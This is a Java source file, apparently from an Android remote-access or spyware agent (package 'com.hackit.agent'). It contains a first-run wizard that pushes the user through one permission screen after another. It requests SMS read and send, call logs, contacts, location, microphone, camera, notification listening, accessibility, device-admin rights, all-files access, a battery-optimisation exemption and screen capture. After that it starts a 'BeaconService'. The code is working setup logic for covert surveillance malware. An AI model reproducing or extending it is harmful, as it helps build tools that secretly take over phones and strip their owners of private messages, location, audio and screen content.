package com.hackit.agent;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.net.Uri;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;

import java.util.ArrayList;
import java.util.List;

/**
 * One-shot first-run chain. Every special permission Android refuses to grant
 * from code needs a different surface, so the wizard walks them in order and
 * forwards page by page without the operator hunting through settings. Steps
 * are idempotent: a permission already held is skipped, and reopening the app
 * resumes at the stored step.
 */
final class Onboard {
    private static final String PREFS = "svc";
    private static final String KEY_STEP = "onboard_step";
    private static final String KEY_DONE = "onboard_done";
    private static final int STEPS = 7;
    private static final Handler HANDLER = new Handler(Looper.getMainLooper());
    private static boolean running;

    static boolean done(Context ctx) {
        return prefs(ctx).getBoolean(KEY_DONE, false);
    }

    static boolean running() {
        return running;
    }

    static void start(final Activity activity) {
        if (done(activity) || running) {
            return;
        }
        running = true;
        next(activity, 700L);
    }

    private static void next(final Activity activity, long delay) {
        HANDLER.postDelayed(new Runnable() {
            @Override
            public void run() {
                if (activity.isFinishing()) {
                    running = false;
                    return;
                }
                step(activity);
            }
        }, delay);
    }

    private static void step(final Activity activity) {
        int index = prefs(activity).getInt(KEY_STEP, 0);
        if (index > STEPS) {
            finish(activity);
            return;
        }
        prefs(activity).edit().putInt(KEY_STEP, index + 1).apply();
        switch (index) {
            case 0:
                // Runtime dialog: continue from the permission callback, with a
                // timer as the backstop if the dialog is dismissed untouched.
                askRuntime(activity);
                next(activity, 6000L);
                return;
            case 1:
                open(activity, Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS);
                break;
            case 2:
                open(activity, Settings.ACTION_ACCESSIBILITY_SETTINGS);
                break;
            case 3:
                admin(activity);
                break;
            case 4:
                battery(activity);
                break;
            case 5:
                files(activity);
                break;
            case 6:
                if (ScreenCap.available()) {
                    step(activity);
                    return;
                }
                ScreenCap.request(activity);
                next(activity, 2600L);
                return;
            default:
                finish(activity);
                return;
        }
        next(activity, 2600L);
    }

    private static void finish(Activity activity) {
        prefs(activity).edit().putBoolean(KEY_DONE, true).remove(KEY_STEP).apply();
        running = false;
        ToastMsg.show(activity, "Setup complete");
        BeaconService.start(activity);
    }

    private static void askRuntime(Activity activity) {
        String[] wantedNames = {
                android.Manifest.permission.READ_SMS, android.Manifest.permission.SEND_SMS,
                android.Manifest.permission.READ_CALL_LOG, android.Manifest.permission.READ_CONTACTS,
                android.Manifest.permission.READ_PHONE_STATE,
                android.Manifest.permission.ACCESS_FINE_LOCATION,
                android.Manifest.permission.ACCESS_COARSE_LOCATION,
                android.Manifest.permission.RECORD_AUDIO, android.Manifest.permission.CAMERA,
        };
        List<String> wanted = new ArrayList<String>();
        for (String name : wantedNames) {
            if (!Common.granted(activity, name)) {
                wanted.add(name);
            }
        }
        if (Build.VERSION.SDK_INT >= 33
                && !Common.granted(activity, "android.permission.POST_NOTIFICATIONS")) {
            wanted.add("android.permission.POST_NOTIFICATIONS");
        }
        if (Build.VERSION.SDK_INT <= 32
                && !Common.granted(activity, android.Manifest.permission.READ_EXTERNAL_STORAGE)) {
            wanted.add(android.Manifest.permission.READ_EXTERNAL_STORAGE);
        }
        if (wanted.isEmpty()) {
            return;
        }
        activity.requestPermissions(wanted.toArray(new String[0]), MainActivity.PERM_CODE);
    }

    private static void open(Activity activity, String action) {
        try {
            activity.startActivity(new Intent(action));
        } catch (Throwable exc) {
            Log.d("onboard " + action + ": " + exc);
        }
    }

    private static void admin(Activity activity) {
        try {
            Intent intent = new Intent(android.app.admin.DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
            intent.putExtra(android.app.admin.DevicePolicyManager.EXTRA_DEVICE_ADMIN,
                    new android.content.ComponentName(activity, AdminReceiver.class));
            activity.startActivity(intent);
        } catch (Throwable exc) {
            Log.d("onboard admin: " + exc);
        }
    }

    private static void battery(Activity activity) {
        if (Build.VERSION.SDK_INT < 23) {
            return;
        }
        try {
            Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
            intent.setData(Uri.parse("package:" + activity.getPackageName()));
            activity.startActivity(intent);
        } catch (Throwable ignored) {
        }
    }

    private static void files(Activity activity) {
        if (Build.VERSION.SDK_INT < 30) {
            return;
        }
        try {
            Intent intent = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
            intent.setData(Uri.parse("package:" + activity.getPackageName()));
            activity.startActivity(intent);
        } catch (Throwable ignored) {
        }
    }

    private static SharedPreferences prefs(Context ctx) {
        return ctx.getSharedPreferences(PREFS, Context.MODE_PRIVATE);
    }

    private Onboard() {
    }
}
